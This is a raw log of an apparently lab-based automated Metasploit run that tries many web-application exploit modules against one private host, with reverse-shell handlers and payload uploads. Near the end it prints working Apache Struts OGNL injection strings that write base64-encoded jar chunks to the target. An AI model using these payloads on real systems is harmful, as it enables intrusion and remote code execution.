[-] [2016.06.04-09:44:05] No payloads were compatible with exploit/multi/http/snortreport_exec)
[-] [2016.06.04-09:44:05] [0199] 10.198.0.1:8080 - Exploit failed: A payload has not been selected.
[*] [2016.06.04-09:44:05] [0198] Unsupported version: Apache/2.4.10 (Debian)
[*] [2016.06.04-09:44:05] [0198] Glassfish edition: Apache/2.4.10 (Debian)
[*] [2016.06.04-09:44:05] [0198] Trying to login as admin:
[-] [2016.06.04-09:44:05] [0198] Exploit aborted due to failure: no-access: http://10.198.0.1:80/ - GlassFish - Failed to authenticate
[+] [2016.06.04-09:44:06] Workspace:lab5 Progress:204/775 (26%) [200/770] 10.198.0.1:80 - WeBid converter.php Remote PHP Code Injection
[*] [2016.06.04-09:44:06] [0200] Started reverse TCP handler on 0.0.0.0:1133
[*] [2016.06.04-09:44:06] [0200] Injecting the PHP payload
[-] [2016.06.04-09:44:06] [0200] Server returned non-200 status code (302)
[+] [2016.06.04-09:44:06] Workspace:lab5 Progress:205/775 (26%) [201/770] 10.198.0.1:8080 - Sun/Oracle GlassFish Server Authenticated Code Execution
[*] [2016.06.04-09:44:06] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:44:06] [0201] Started reverse TCP handler on 0.0.0.0:1134
[*] [2016.06.04-09:44:06] [0201] Unsupported version: Apache-Coyote/1.1
[*] [2016.06.04-09:44:06] [0201] Glassfish edition: Apache-Coyote/1.1
[+] [2016.06.04-09:44:06] Workspace:lab5 Progress:206/775 (26%) [202/770] 10.198.0.1:8080 - Simple Backdoor Shell Remote Code Execution
[-] [2016.06.04-09:44:06] No reverse connect payloads available for exploit/multi/http/simple_backdoors_exec
[-] [2016.06.04-09:44:06] No payloads were compatible with exploit/multi/http/simple_backdoors_exec)
[-] [2016.06.04-09:44:06] [0202] Exploit failed: A payload has not been selected.
[*] [2016.06.04-09:44:06] [0201] Trying to login as admin:
[-] [2016.06.04-09:44:06] [0201] Exploit aborted due to failure: no-access: http://10.198.0.1:8080/ - GlassFish - Failed to authenticate
[+] [2016.06.04-09:44:07] Workspace:lab5 Progress:207/775 (26%) [203/770] 10.198.0.1:80 - CA Total Defense Suite reGenerateReports Stored Procedure SQL Injection
[*] [2016.06.04-09:44:07] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:44:07] [0203] Started reverse TCP handler on 0.0.0.0:1135
[*] [2016.06.04-09:44:07] [0203] Sending request to 10.198.0.1:80
[+] [2016.06.04-09:44:08] Workspace:lab5 Progress:208/775 (26%) [204/770] 10.198.0.1:8080 - SePortal SQLi Remote Code Execution
[*] [2016.06.04-09:44:08] [0204] Started reverse TCP handler on 0.0.0.0:1136
[-] [2016.06.04-09:44:08] [0203] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 state=SSLv2/v3 read server hello A: unknown protocol
[*] [2016.06.04-09:44:08] [0204] Logging in as user [ test ]
[-] [2016.06.04-09:44:09] [0204] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - Login was not succesful!
[+] [2016.06.04-09:44:09] Workspace:lab5 Progress:209/775 (26%) [205/770] 10.198.0.1:8080 - WordPress Platform Theme File Upload Vulnerability
[*] [2016.06.04-09:44:09] [0205] Started reverse TCP handler on 0.0.0.0:1137
[*] [2016.06.04-09:44:09] [0205] Uploading payload
[+] [2016.06.04-09:44:09] Workspace:lab5 Progress:210/775 (27%) [206/770] 10.198.0.1:8080 - VMware Hyperic HQ Groovy Script-Console Java Execution
[*] [2016.06.04-09:44:09] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:44:09] [0206] Started reverse TCP handler on 0.0.0.0:1138
[+] [2016.06.04-09:44:10] Workspace:lab5 Progress:211/775 (27%) [207/770] 10.198.0.1:8080 - Simple E-Document Arbitrary File Upload
[-] [2016.06.04-09:44:10] [0206] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 state=SSLv2/v3 read server hello A: unknown protocol
[*] [2016.06.04-09:44:10] [0207] Started reverse TCP handler on 0.0.0.0:1139
[*] [2016.06.04-09:44:10] [0207] Uploading PHP payload...
[-] [2016.06.04-09:44:10] [0207] Exploit aborted due to failure: not-found: 10.198.0.1:8080 - No upload.php found
[+] [2016.06.04-09:44:10] Workspace:lab5 Progress:212/775 (27%) [208/770] 10.198.0.1:80 - CA Arcserve D2D GWT RPC Credential Information Disclosure
[*] [2016.06.04-09:44:10] [0208] Started reverse TCP handler on 0.0.0.0:1140
[*] [2016.06.04-09:44:10] [0208] Sending request to 10.198.0.1:80
[-] [2016.06.04-09:44:11] [0208] Exploit aborted due to failure: not-found: The server did not return credentials
[+] [2016.06.04-09:44:11] Workspace:lab5 Progress:213/775 (27%) [209/770] 10.198.0.1:8080 - JBoss JMX Console Beanshell Deployer WAR Upload and Deployment
[-] [2016.06.04-09:44:11] [0209] Exploit aborted due to failure: not-found: The target server fingerprint "Apache-Coyote/1.1" does not match "(?-mix:(Jetty|JBoss))", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-09:44:11] Workspace:lab5 Progress:214/775 (27%) [210/770] 10.198.0.1:8080 - JBoss Java Class DeploymentFileRepository WAR Deployment
[-] [2016.06.04-09:44:11] [0210] Exploit aborted due to failure: not-found: The target server fingerprint "Apache-Coyote/1.1" does not match "(?-mix:(Jetty|JBoss))", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-09:44:11] Workspace:lab5 Progress:215/775 (27%) [211/770] 10.198.0.1:80 - Joomla Component JCE File Upload Remote Code Execution
[*] [2016.06.04-09:44:12] [0211] Started reverse TCP handler on 0.0.0.0:1143
[*] [2016.06.04-09:44:12] [0211] Checking component version to 10.198.0.1:80
[+] [2016.06.04-09:44:12] Workspace:lab5 Progress:216/775 (27%) [212/770] 10.198.0.1:80 - LotusCMS 3.0 eval() Remote Command Execution
[*] [2016.06.04-09:44:12] [0212] Started reverse TCP handler on 0.0.0.0:1144
[-] [2016.06.04-09:44:12] [0212] Unable to get the page parameter, please reconfigure URI
[+] [2016.06.04-09:44:12] Workspace:lab5 Progress:217/775 (28%) [213/770] 10.198.0.1:8080 - JBoss DeploymentFileRepository WAR Deployment (via JMXInvokerServlet)
[*] [2016.06.04-09:44:12] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-09:44:12] [0213] Exploit aborted due to failure: not-found: The target server fingerprint "Apache-Coyote/1.1" does not match "(?-mix:JBoss)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-09:44:13] Workspace:lab5 Progress:218/775 (28%) [214/770] 10.198.0.1:80 - Novell ZENworks Asset Management Remote Execution
[-] [2016.06.04-09:44:13] [0214] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:Apache-Coyote)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-09:44:14] Workspace:lab5 Progress:219/775 (28%) [215/770] 10.198.0.1:8080 - JBoss JMX Console Deployer Upload and Execute
[+] [2016.06.04-09:44:14] Workspace:lab5 Progress:220/775 (28%) [216/770] 10.198.0.1:80 - LifeSize Room Command Injection
[-] [2016.06.04-09:44:14] No reverse connect payloads available for exploit/unix/http/lifesize_room
[-] [2016.06.04-09:44:14] No payloads were compatible with exploit/unix/http/lifesize_room)
[-] [2016.06.04-09:44:14] [0216] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:15] Workspace:lab5 Progress:221/775 (28%) [217/770] 10.198.0.1:80 - Spreecommerce 0.60.1 Arbitrary Command Execution
[-] [2016.06.04-09:44:15] No reverse connect payloads available for exploit/multi/http/spree_search_exec
[-] [2016.06.04-09:44:15] No payloads were compatible with exploit/multi/http/spree_search_exec)
[-] [2016.06.04-09:44:15] [0217] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:15] Workspace:lab5 Progress:222/775 (28%) [218/770] 10.198.0.1:8080 - Ruby on Rails Known Secret Session Cookie Remote Code Execution
[-] [2016.06.04-09:44:15] No reverse connect payloads available for exploit/multi/http/rails_secret_deserialization
[-] [2016.06.04-09:44:15] No payloads were compatible with exploit/multi/http/rails_secret_deserialization)
[+] [2016.06.04-09:44:15] Workspace:lab5 Progress:223/775 (28%) [219/770] 10.198.0.1:8080 - Simple PHP Blog Remote Command Execution
[*] [2016.06.04-09:44:15] [0219] Started reverse TCP handler on 0.0.0.0:1149
[-] [2016.06.04-09:44:16] [0219] Exploit aborted due to failure: not-vulnerable: Failed to retrieve hash, server may not be vulnerable.
[+] [2016.06.04-09:44:16] Workspace:lab5 Progress:224/775 (28%) [220/770] 10.198.0.1:80 - Plone and Zope XMLTools Remote Command Execution
[-] [2016.06.04-09:44:16] No reverse connect payloads available for exploit/multi/http/plone_popen2
[-] [2016.06.04-09:44:16] No payloads were compatible with exploit/multi/http/plone_popen2)
[-] [2016.06.04-09:44:16] [0220] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:16] Workspace:lab5 Progress:225/775 (29%) [221/770] 10.198.0.1:80 - myBB 1.6.4 Backdoor Arbitrary Command Execution
[*] [2016.06.04-09:44:16] [0221] Started reverse TCP handler on 0.0.0.0:1150
[*] [2016.06.04-09:44:16] [0221] Sending exploit request
[-] [2016.06.04-09:44:16] [0221] Cannot connect to /index.php on 10.198.0.1, got 302.
[+] [2016.06.04-09:44:17] Workspace:lab5 Progress:226/775 (29%) [222/770] 10.198.0.1:80 - Support Incident Tracker Remote Command Execution
[+] [2016.06.04-09:44:17] Workspace:lab5 Progress:227/775 (29%) [223/770] 10.198.0.1:80 - Apache Struts ParametersInterceptor Remote Code Execution
[*] [2016.06.04-09:44:17] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:44:17] [0223] Started reverse TCP handler on 0.0.0.0:1152
[-] [2016.06.04-09:44:17] [0223] Exploit failed: Msf::NoCompatiblePayloadError Failed to generate an executable payload due to an invalid platform or arch.
[+] [2016.06.04-09:44:17] Workspace:lab5 Progress:228/775 (29%) [224/770] 10.198.0.1:80 - phpLDAPadmin query_engine Remote PHP Code Injection
[*] [2016.06.04-09:44:17] [0224] Started reverse TCP handler on 0.0.0.0:1153
[-] [2016.06.04-09:44:18] [0224] Could not generate a valid session
[+] [2016.06.04-09:44:18] Workspace:lab5 Progress:229/775 (29%) [225/770] 10.198.0.1:8080 - Wordpress N-Media Website Contact Form Upload Vulnerability
[+] [2016.06.04-09:44:18] Workspace:lab5 Progress:230/775 (29%) [226/770] 10.198.0.1:8080 - TikiWiki tiki-graph_formula Remote PHP Code Execution
[*] [2016.06.04-09:44:18] [0225] Started reverse TCP handler on 0.0.0.0:1154
[*] [2016.06.04-09:44:18] [0226] Started reverse TCP handler on 0.0.0.0:1155
[*] [2016.06.04-09:44:18] [0226] Attempting to obtain database credentials...
[*] [2016.06.04-09:44:18] [0226] No response from the server
[*] [2016.06.04-09:44:18] [0226] Attempting to execute our payload...
[-] [2016.06.04-09:44:18] [0225] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:8080 - Unable to deploy payload, server returned 404
[+] [2016.06.04-09:44:18] Workspace:lab5 Progress:231/775 (29%) [227/770] 10.198.0.1:80 - HP Managed Printing Administration jobAcct Remote Command Execution
[*] [2016.06.04-09:44:18] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:44:19] [0227] Started reverse TCP handler on 0.0.0.0:1156
[*] [2016.06.04-09:44:20] [0227] Uploading 13599 bytes to /hpmpa/userfiles/images/printers/...
[-] [2016.06.04-09:44:20] [0227] Unknown error while while writing to /hpmpa/userfiles/images/printers/
[*] [2016.06.04-09:44:20] [0227] Uploading 13599 bytes to /hpmpa/userfiles/images/backgrounds/...
[-] [2016.06.04-09:44:20] [0227] Unknown error while while writing to /hpmpa/userfiles/images/backgrounds/
[*] [2016.06.04-09:44:20] [0227] Uploading 13599 bytes to /hpmpa/userfiles/images/...
[-] [2016.06.04-09:44:20] [0227] Unknown error while while writing to /hpmpa/userfiles/images/
[*] [2016.06.04-09:44:20] [0227] Uploading 13599 bytes to /hpmpa/userfiles/...
[-] [2016.06.04-09:44:20] [0227] Unknown error while while writing to /hpmpa/userfiles/
[*] [2016.06.04-09:44:20] [0227] Uploading 13599 bytes to /...
[+] [2016.06.04-09:44:20] Workspace:lab5 Progress:232/775 (29%) [228/770] 10.198.0.1:80 - WikkaWiki 1.3.2 Spam Logging PHP Injection
[-] [2016.06.04-09:44:20] [0227] Unknown error while while writing to /
[-] [2016.06.04-09:44:20] [0227] Exploit aborted due to failure: not-vulnerable: 10.198.0.1:80 - Failed to upload ASP payload to the target
[+] [2016.06.04-09:44:21] Workspace:lab5 Progress:233/775 (30%) [229/770] 10.198.0.1:80 - PmWiki pagelist.php Remote PHP Code Injection Exploit
[*] [2016.06.04-09:44:21] [0229] Started reverse TCP handler on 0.0.0.0:1158
[+] [2016.06.04-09:44:21] Workspace:lab5 Progress:234/775 (30%) [230/770] 10.198.0.1:80 - Hastymail 2.1.1 RC1 Command Injection
[-] [2016.06.04-09:44:21] No reverse connect payloads available for exploit/unix/webapp/hastymail_exec
[-] [2016.06.04-09:44:21] No payloads were compatible with exploit/unix/webapp/hastymail_exec)
[+] [2016.06.04-09:44:21] Workspace:lab5 Progress:235/775 (30%) [231/770] 10.198.0.1:80 - Splunk Search Remote Code Execution
[-] [2016.06.04-09:44:21] No reverse connect payloads available for exploit/multi/http/splunk_mappy_exec
[-] [2016.06.04-09:44:21] No payloads were compatible with exploit/multi/http/splunk_mappy_exec)
[-] [2016.06.04-09:44:22] [0231] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:22] Workspace:lab5 Progress:236/775 (30%) [232/770] 10.198.0.1:80 - Log1 CMS writeInfo() PHP Code Injection
[*] [2016.06.04-09:44:22] [0232] Started reverse TCP handler on 0.0.0.0:1159
[*] [2016.06.04-09:44:22] [0232] Sending PHP payload (1305 bytes)
[*] [2016.06.04-09:44:22] [0232] Requesting data.php
[+] [2016.06.04-09:44:22] Workspace:lab5 Progress:237/775 (30%) [233/770] 10.198.0.1:8080 - TikiWiki jhot Remote Command Execution
[-] [2016.06.04-09:44:22] No reverse connect payloads available for exploit/unix/webapp/tikiwiki_jhot_exec
[-] [2016.06.04-09:44:22] No payloads were compatible with exploit/unix/webapp/tikiwiki_jhot_exec)
[-] [2016.06.04-09:44:22] [0233] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:23] Workspace:lab5 Progress:238/775 (30%) [234/770] 10.198.0.1:80 - V-CMS PHP File Upload and Execute
[*] [2016.06.04-09:44:23] [0234] Started reverse TCP handler on 0.0.0.0:1160
[*] [2016.06.04-09:44:23] [0234] 10.198.0.1:80 Uploading payload: mjbYz.php
[*] [2016.06.04-09:44:23] [0234] 10.198.0.1:80 replies status: 302
[*] [2016.06.04-09:44:23] [0234] 10.198.0.1:80 Executing payload: mjbYz.php
[+] [2016.06.04-09:44:23] Workspace:lab5 Progress:239/775 (30%) [235/770] 10.198.0.1:80 - Joomla 1.5.12 TinyBrowser File Upload Code Execution
[*] [2016.06.04-09:44:23] [0235] Started reverse TCP handler on 0.0.0.0:1161
[-] [2016.06.04-09:44:23] [0235] Error retrieving obfuscation code!
[+] [2016.06.04-09:44:24] Workspace:lab5 Progress:240/775 (30%) [236/770] 10.198.0.1:80 - Redmine SCM Repository Arbitrary Command Execution
[-] [2016.06.04-09:44:24] No reverse connect payloads available for exploit/unix/webapp/redmine_scm_exec
[-] [2016.06.04-09:44:24] No payloads were compatible with exploit/unix/webapp/redmine_scm_exec)
[-] [2016.06.04-09:44:24] [0236] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:24] Workspace:lab5 Progress:241/775 (31%) [237/770] 10.198.0.1:80 - Family Connections less.php Remote Command Execution
[-] [2016.06.04-09:44:24] No reverse connect payloads available for exploit/multi/http/familycms_less_exec
[-] [2016.06.04-09:44:24] No payloads were compatible with exploit/multi/http/familycms_less_exec)
[-] [2016.06.04-09:44:24] [0237] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:25] Workspace:lab5 Progress:242/775 (31%) [238/770] 10.198.0.1:80 - Traq admincp/common.php Remote Code Execution
[*] [2016.06.04-09:44:25] [0238] Started reverse TCP handler on 0.0.0.0:1162
[+] [2016.06.04-09:44:25] Workspace:lab5 Progress:243/775 (31%) [239/770] 10.198.0.1:80 - Horde 3.3.12 Backdoor Arbitrary PHP Code Execution
[-] [2016.06.04-09:44:25] No reverse connect payloads available for exploit/multi/http/horde_href_backdoor
[-] [2016.06.04-09:44:25] No payloads were compatible with exploit/multi/http/horde_href_backdoor)
[-] [2016.06.04-09:44:25] [0239] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:26] Workspace:lab5 Progress:244/775 (31%) [240/770] 10.198.0.1:80 - OP5 license.php Remote Command Execution
[-] [2016.06.04-09:44:26] No reverse connect payloads available for exploit/multi/http/op5_license
[-] [2016.06.04-09:44:26] No payloads were compatible with exploit/multi/http/op5_license)
[-] [2016.06.04-09:44:26] [0240] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:26] Workspace:lab5 Progress:245/775 (31%) [241/770] 10.198.0.1:80 - OP5 welcome Remote Command Execution
[+] [2016.06.04-09:44:26] Workspace:lab5 Progress:246/775 (31%) [242/770] 10.198.0.1:8080 - WordPress cache_lastpostdate Arbitrary Code Execution
[-] [2016.06.04-09:44:26] No reverse connect payloads available for exploit/unix/webapp/wp_lastpost_exec
[-] [2016.06.04-09:44:26] No payloads were compatible with exploit/unix/webapp/wp_lastpost_exec)
[-] [2016.06.04-09:44:26] [0242] 10.198.0.1:8080 - Exploit failed: A payload has not been selected.
[-] [2016.06.04-09:44:26] No reverse connect payloads available for exploit/multi/http/op5_welcome
[-] [2016.06.04-09:44:26] No payloads were compatible with exploit/multi/http/op5_welcome)
[-] [2016.06.04-09:44:26] [0241] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:27] Workspace:lab5 Progress:247/775 (31%) [243/770] 10.198.0.1:80 - Symantec Web Gateway 5.0.2.8 relfile File Inclusion Vulnerability
[*] [2016.06.04-09:44:27] [0243] Started reverse TCP handler on 0.0.0.0:1163
[*] [2016.06.04-09:44:27] [0243] 10.198.0.1:80 doesn't look like Symantec Web Gateway, will not engage.
[+] [2016.06.04-09:44:27] Workspace:lab5 Progress:248/775 (32%) [244/770] 10.198.0.1:80 - Symantec Web Gateway 5.0.2.8 ipchange.php Command Injection
[-] [2016.06.04-09:44:27] No reverse connect payloads available for exploit/linux/http/symantec_web_gateway_exec
[-] [2016.06.04-09:44:27] No payloads were compatible with exploit/linux/http/symantec_web_gateway_exec)
[-] [2016.06.04-09:44:27] [0244] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:28] Workspace:lab5 Progress:249/775 (32%) [245/770] 10.198.0.1:8080 - phpScheduleIt PHP reserve.php start_date Parameter Arbitrary Code Injection
[*] [2016.06.04-09:44:28] [0245] Started reverse TCP handler on 0.0.0.0:1164
[*] [2016.06.04-09:44:28] [0245] Sending request for: /phpscheduleit/
[*] [2016.06.04-09:44:28] [0245] Payload embedded in header: X-ZPDGPIWZDJPKMDTD
[-] [2016.06.04-09:44:28] [0245] Server returned a non-200 status code: (404)
[+] [2016.06.04-09:44:28] Workspace:lab5 Progress:250/775 (32%) [246/770] 10.198.0.1:8080 - ManageEngine ServiceDesk Plus Arbitrary File Upload
[*] [2016.06.04-09:44:28] [0246] Started reverse TCP handler on 0.0.0.0:1165
[*] [2016.06.04-09:44:28] [0246] Uploading EAR file...
[-] [2016.06.04-09:44:28] [0246] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - EAR upload failed
[+] [2016.06.04-09:44:28] Workspace:lab5 Progress:251/775 (32%) [247/770] 10.198.0.1:8080 - TWiki History TWikiUsers rev Parameter Command Execution
[-] [2016.06.04-09:44:28] No reverse connect payloads available for exploit/unix/webapp/twiki_history
[-] [2016.06.04-09:44:28] No payloads were compatible with exploit/unix/webapp/twiki_history)
[-] [2016.06.04-09:44:28] [0247] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:29] Workspace:lab5 Progress:252/775 (32%) [248/770] 10.198.0.1:80 - Symantec Web Gateway 5.0.2.8 Arbitrary PHP File Upload Vulnerability
[*] [2016.06.04-09:44:29] [0248] Started reverse TCP handler on 0.0.0.0:1166
[*] [2016.06.04-09:44:29] [0248] Sending PHP payload (PjyYeDIRSwdb.php)
[-] [2016.06.04-09:44:29] [0248] File wasn't uploaded, aborting!
[+] [2016.06.04-09:44:29] Workspace:lab5 Progress:253/775 (32%) [249/770] 10.198.0.1:80 - Apache Struts Remote Command Execution
[*] [2016.06.04-09:44:29] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[+] [2016.06.04-09:44:30] Workspace:lab5 Progress:254/775 (32%) [250/770] 10.198.0.1:8080 - phpFileManager 0.9.8 Remote Code Execution
[-] [2016.06.04-09:44:30] No reverse connect payloads available for exploit/multi/http/phpfilemanager_rce
[-] [2016.06.04-09:44:30] No payloads were compatible with exploit/multi/http/phpfilemanager_rce)
[-] [2016.06.04-09:44:30] [0250] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:44:30] Workspace:lab5 Progress:255/775 (32%) [251/770] 10.198.0.1:8080 - WordPress Plugin Foxypress uploadify.php Arbitrary Code Execution
[*] [2016.06.04-09:44:31] [0251] Started reverse TCP handler on 0.0.0.0:1168
[*] [2016.06.04-09:44:31] [0251] Sending PHP payload
[-] [2016.06.04-09:44:31] [0251] File wasn't uploaded, aborting!
[+] [2016.06.04-09:44:31] Workspace:lab5 Progress:256/775 (33%) [252/770] 10.198.0.1:80 - Apache Struts 2 Developer Mode OGNL Execution
[*] [2016.06.04-09:44:31] [0252] Started reverse TCP handler on 0.0.0.0:1169
[*] [2016.06.04-09:44:31] [0252] Attempting to execute: #f=new java.io.FileOutputStream('e0dJnh.jar',false),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('UEsDBBQAAAAIAJ9NxEhoQM8mIwAAACQAAAAOAAAAbWV0YXNwbG9pdC5kYXQLLkgsz7M14vLx8A8OsTU00DO0tNAz0AMKBPgHAQUMzSy5AFBLAwQUAAAAAACfTcRIAAAAAAAAAAAAAAAACwAAAG1ldGFzcGxvaXQvUEsDBBQAAAAIAJ9NxEhwey3fThEAAEEhAAAYAAAAbWV0YXNwbG9pdC9QYXlsb2FkLmNsYXNzlRgJeBTl9b3Z2Z3ZyeRgwgLDoYiKS05FjLh4NIQg0VywwRhRcdidkJXNTtyZkKDWWkVttfcpVtRSNPawQrSbaNR6tHjUs61ardaztNbWWrV3lb43s0s2yWJpPvjP97/7mn3so7vvA4BjhBoFHoG9EvxOAYHn30vwlgJ+2KvAqfAHBZbC27z9owx/4vkdGf7MN+8y+F8UsOE9Gd7nzQcy/FWGvykwA/7Owz8k+CfP/5Lh3zz/h4cPefhIARH20RsEGZFOUOCNT0ZRRj8vAwpKKBNx')),#f.close()
[*] [2016.06.04-09:44:31] [0252] Attempting to execute: #f=new java.io.FileOutputStream('e0dJnh.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('DPJWkbGIwVQeimUskbFUxjK+nyajJmO5jNNlDMk4Q8KZChyLs/iZTit4T8HZOEfCuTLOI7p4iIyH8tF8BQ/DBTwc7gf3T3pawSPwSKaxMHsE8SA9OUrGsISLgliBlSQ7VklYzZsaBWvxaAmPkXGxjMcyriUSHqfAaqyT8XgZl8p4QhAjuIyHE2U8ScKTmelTZPwEz/UKdOFyCRsUOJf1cy6ukLGRSayU8VQJVykQJx7pvEnC0xTYSAbC0xVIYLOELQpswlYe2mggOel4AQ/tMq6WcY2EUQk7JFwr4Rkydsp4poxdCmzGs3hYx8PZbIi9Mp7DijlXxvVkTzyP9WdIuEGByzEmYVyBK5iuqcBV7BVXYLeEGyXskTEh4fkKXIObFLgakwzfy0OK0Vk89Ml4AYuTltGW0JGwX8LNCmzDAQWuxUFW7hYeLpTxIoa/WMZP8nyJjJ/i+VI2xqclvEyBm5m2iJfTCrcG6fgKluBKGa9iTX5Gxs/yzdU8XCPh5xTY')),#f.close()
[*] [2016.06.04-09:44:31] [0252] Attempting to execute: #f=new java.io.FileOutputStream('e0dJnh.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('BXsZ7PO0wi/w8Rd59SW+eIeffJmHr/DwVXJs/Bqvvs7DN3j4pozXKhiBD4K4Da/jk28xo9fLuJ3nG2S8UcabZPy2hDsQpLbo+tb6lkYErfl8Y7NRmzRSG2ujTjqR2riMvLy9vmPV+mhjO0KgKbq+vulMBDzL26xoiyIET6s/o379qjbGEDgxkUo4JyP4wovOQBAbrLhJU6+RSCHMCK+bSoDBlMbBmNnnJKyUjTBtIJ1wzMbeDWY8bsZXJpKEYEk472FD0rDtZVMxeScJq5bfEF4JvyPhTuJvg2U5tpM2+hCi4f1QTam+foeemkbv+NO2fmfyaT6JA/BfttF0TkubjYNmrN8xNjDHC8MFQAupVzXi8cZBx0zZJD4x251IxZtSKxLpSVJPELIA1pzchCJlpXuNZOJCYmNB+CAeSPGEbZsxB+GoQuDrCnrFibGka2oVnoZnEKa7MP1OIlnbnrb6zLSTMMmYWq/pGHZf0ko4te3GlqRlxBFmTsa3vD+RjJtp')),#f.close()
[+] [2016.06.04-09:44:31] Workspace:lab5 Progress:257/775 (33%) [253/770] 10.198.0.1:8080 - Th3 MMA mma.php Backdoor Arbitrary File Upload
[*] [2016.06.04-09:44:32] [0252] Attempting to execute: #f=new java.io.FileOutputStream('e0dJnh.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('FW/GW1QcwltV/C5+j7ypJsa2VvH7eAtCae04spq44aj4A7xNxR/i7SruYh6UcQOouBteJgSX2H3GAKlVrHF6+1QchldVvAPvJLXn60DFHzEBsSaeSJM8mFFxBO/k1agKz8HzKt6Fd5NnriDJ+sx4Ppkx5vgevBfBH/VI4dFEHO+T8Mcq3o8PqPggPqTiT/CnCCWTBdiDD6v4CPPjW7umGQGI5R7H6bMjKj6KjyEcMVV/Hel+22kxUsZGM+3pB0H/mLui+sZoO60GrDTp/pA8hHTRmIqlt7iRlwMvL3g6K19d+UHCSvqZio/jExI+qeJT+DSFw2T7kmr5SIWX2ChKtYu0z3B6VHwGfy7hL1T8JT6r4nP4rISk7V/hCyq+CM+o8CQ8gVBsm05+bJVOygUS/lrFl/BlFX+Dr0wg37bhfPJrFV/F1yR8XcU38E2EQ8fvW61of6ynxXR6rPj+HESmjPX0WqQsoXJQxd/iXtLK+Jv9cCr+jr3O39zetqaDRFxC')),#f.close()
[*] [2016.06.04-09:44:32] [0253] Started reverse TCP handler on 0.0.0.0:1170
[*] [2016.06.04-09:44:32] [0253] Trying to upload nfIjJ.php to mma.php Backdoor
[*] [2016.06.04-09:44:32] [0252] Attempting to execute: #f=new java.io.FileOutputStream('e0dJnh.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('f7xd1RalyvV7Fd/CP6j4Nv6R7tLGQARhbk6Ly7c4Zn06bWzJS0Iq/gkfIu00Rduqly497oTqY1R8B//MCn43568p06klR1HxL/jeBFvWFHAAFd/HD8ih+m1zpUXpZEY+igYrlSLVuGL8FZ9FmDeFt3wz55TOr6NWbJPpMF9/QwiNH5vpzWZ6/PLvKv4D/6niv/Df5D95rE5wMPLPAcrMHhU7p+iJ6TmXXSblZwLOT02erSk16eOpyHO/DmuTmaJ0SDooyuppfnX1fJIp6pCi2o20QeyZaSKP85n1/6j4Ie5V8SPOCsW5UuQCq/Ai/JrgalXcJ4AqoCDkEhqxt8JwjHyTEq7bcwxRhu2nyraltt1M91LC9ardnIl39cnk+LUq+ASRzDzpedpyPMutsLy6OmsiANfcqNWfjlGoyN0Ur5Ha2topaGKUomsbOE93J2KGQ4I9Lfh5CKiCRMILMr6rCkFBUYUiQaVMzs/7PO3V2KyKGlUoFkrI42mXdiZZY3+h')),#f.close()
[-] [2016.06.04-09:44:32] [0253] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:8080 - Unable to deploy payload, server returned 404
[*] [2016.06.04-09:44:32] [0252] Attempting to execute: #f=new java.io.FileOutputStream('e0dJnh.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('yIucjp60NeCF8H4ztxPYuLaEUgoqoUyFx+EJFZ4CyoC+WrtHhVfgVYqi2g2JlAq/4SQi1piDxPNr8LoqTOMEWppvdSO2SYU34E1V0PBuVSiHx1RhOkMhMR0SZlBo19BqJss5i2WYMbUkdXdTCAm6MJuKkTBHFeYK83h1iCocKsynYBUOU4UFwuF8doQqHMmoFgpH8W2YSqpl16TIqyRhkSpUCJWqUCVUq/AoS1TCma/GNvvI7xyLCs7PXDmNxCDxx/WbeanpsXrNXHiNp7pm0j778bz8fNxqOSut/lR+BhsPo7a8U4n6lFaD8U4PF2xGpLTZlzTYcWaEGxoKggQMKoEpSo7VB9XhZEs7dwyOlasG5cTHGtN2fbTezkXzoo/tVfLbNTK/10nMKtzOcU/mjyUtmwQpIlrZjmQL6T5GAI7ZYfb2eZ1lIG4mKfbdhpWa2lKCrt9gW8l+h/KC00MWCBfu+fy9m+LcpB0enthOFYYOpM1ea/PkvjCbshYVymLc')),#f.close()
